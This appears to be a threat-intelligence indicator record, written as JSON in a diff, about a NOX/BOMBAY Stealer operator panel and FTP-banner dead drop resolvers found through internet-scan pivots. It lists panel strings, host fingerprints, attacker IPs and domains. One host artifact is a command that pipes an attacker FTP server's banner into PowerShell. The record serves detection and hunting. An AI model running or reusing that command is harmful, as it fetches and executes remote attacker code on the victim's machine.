@@ -1,0 +1,370 @@
+{
+  "malware_family": "NOX Stealer (rebranded BOMBAY Stealer)",
+  "threat_actor": "",
+  "platforms": [
+    "windows"
+  ],
+  "summary": "VirusTotal's Internet Scanning data exposes per-port service banners, products/versions, CPEs and SSH/RDP fingerprints for the public IPv4 space, enabling pivots on rare host keys, certificate subjects and service stacks. The post shows the technique unmasking a NOX/BOMBAY Stealer operator login panel on 5.175.221.206:8443 hosted on a Windows Server 2022 host with SMB/RDP exposed, and hunting FTP-banner dead drop resolvers that pipe a banner-embedded 'ftp <ip>|powershell' command into a shell. Detection value lies in the service banners, panel strings and multi-port host signatures rather than in raw open ports.",
+  "mitre_techniques": [
+    "T1204.002",
+    "T1071.002"
+  ],
+  "host_artifacts": [
+    {
+      "kind": "unique_string",
+      "value": "NOX STEALER - Login",
+      "context": "HTML title of NOX Stealer operator login panel on 5.175.221.206:8443",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "BOMBAY STEALER - Login",
+      "context": "New DOM title captured after in-place rebrand of the same panel",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "currently the top #1 infostealer on the market. register an account today and get 1 month access for free. entirely programmed in C. no digital footprints being stored on our servers",
+      "context": "Meta description in rendered DOM after BOMBAY rebrand",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Lightweight, C++-native infostealer with automated worm propagation",
+      "context": "Login card subtitle, unchanged after BOMBAY rebrand",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "panel_jwt",
+      "context": "Session logic used by the NOX/BOMBAY panel",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "#a855f7",
+      "context": "Tailwind CSS theme colour unchanged across the rebrand",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "#030308",
+      "context": "Tailwind CSS theme background colour unchanged across the rebrand",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "start \"\" conhost.exe --headless cmd /c \"ftp 167.148.41.164|powershell\"",
+      "context": "FTP welcome banner on port 21 used as dead drop resolver, piped to shell",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "ftp <ip> | cmd",
+      "context": "Malicious LNK command that pipes the FTP banner to a shell",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "conhost.exe",
+      "context": "Banner-launched execution proxy searched via port_banner[21]:\"conhost\"",
+      "specificity": "low",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "WIN-BM6C4ESB87V",
+      "context": "NetBIOS host name of Windows Server 2022 host 5.175.221.206",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "10.0.20348",
+      "context": "os_type on port 445, Windows Server 2022 build of the panel host",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "nginx 1.24.0",
+      "context": "Product/version on port 8443 of 5.175.221.206",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "PHP/8.3.33",
+      "context": "PHP version served on port 8443 of 5.175.221.206",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "9.6p1 Ubuntu 3ubuntu13.19",
+      "context": "OpenSSH version on port 22 shared by the pivoted cluster",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "Microsoft Terminal Services",
+      "context": "RDP service product on port 3389 of 5.175.221.206",
+      "specificity": "low",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "ip",
+      "value": "5.175.221.206",
+      "context": "Hosts NOX/BOMBAY Stealer login panel on 8443, SMB 445 and RDP 3389",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://5.175.221.206:8443/",
+      "context": "Operator login panel on raw IP and non-standard port",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://5.175.221.206:8443/login",
+      "context": "NOX Stealer login page shown in the URL report screenshot",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/29f69693228c27033209532b5a6a97d1/",
+      "context": "MD5-prefixed panel route before the rotation",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/3a85f1d2131fa2723ac6ade171eafacd/dashboard",
+      "context": "Rotated MD5-prefixed panel route after the BOMBAY rebrand",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/register",
+      "context": "Registration route on the rebranded BOMBAY panel",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": ""
+    },
+    {
+      "kind": "other",
+      "value": "SHA256:SbF6+nFx6ngfUw2L+jsqN6uu5tdsFc5jUW849WA/Sxw",
+      "context": "SSH host key fingerprint shared by 91.219.237.110 and 185.146.232.3",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "b4ck.my",
+      "context": "Unusual certificate common name on the shared HTTPS cert reused across the cluster",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": ""
+    },
+    {
+      "kind": "http_header",
+      "value": "<meta name=\"robots\" content=\"noindex\">",
+      "context": "193-byte stub response replacing the 11,408-byte login page",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "91.219.237.110",
+      "context": "Hungary-hosted IP in APT28 and Havoc C2 collections, SSH 22 + nginx 80",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "185.146.232.3",
+      "context": "FlokiNET twin host sharing SSH key, OpenSSH build, nginx 1.24.0 and JARM",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "96.9.125.59",
+      "context": "Romania host matched by ssl_subject:\"b4ck.my\", ports 22/80 closed",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "157.254.194.31",
+      "context": "FTP dead drop resolver (port 21 closed) for E4del chain to 167.148.41.164",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "167.148.41.164",
+      "context": "Next hop in conhost FTP banner for 157.254.194.31",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "54.37.237.164",
+      "context": "OVH host serving conhost FTP banner, open port 21 as of 2026-10-01",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "54.37.237.166",
+      "context": "Next hop in FTP banner of 54.37.237.164",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "51.89.199.125",
+      "context": "OVH next hop for banner on 51.89.199.118",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "51.89.199.118",
+      "context": "OVH host serving conhost FTP banner, closed port 21",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "185.14.92.162",
+      "context": "Florian Kolb host serving conhost FTP banner, next hop .223 on same ASN",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "185.14.92.223",
+      "context": "Next hop in FTP banner of 185.14.92.162",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "45.87.41.133",
+      "context": "SpectraIP host serving banner from 2026-06-30, earlier than reported",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "64.111.92.89",
+      "context": "BL Networks (AS399629) next hop, same network as PINHOLE FTP panel",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "grabber.cy",
+      "context": "Sibling domain of NOX STEALER titled URLs, behind Cloudflare",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "lumma.cy",
+      "context": "Sibling domain of NOX STEALER titled URLs, linked to trojan.lumma payloads",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [],
+  "file_types": []
+}
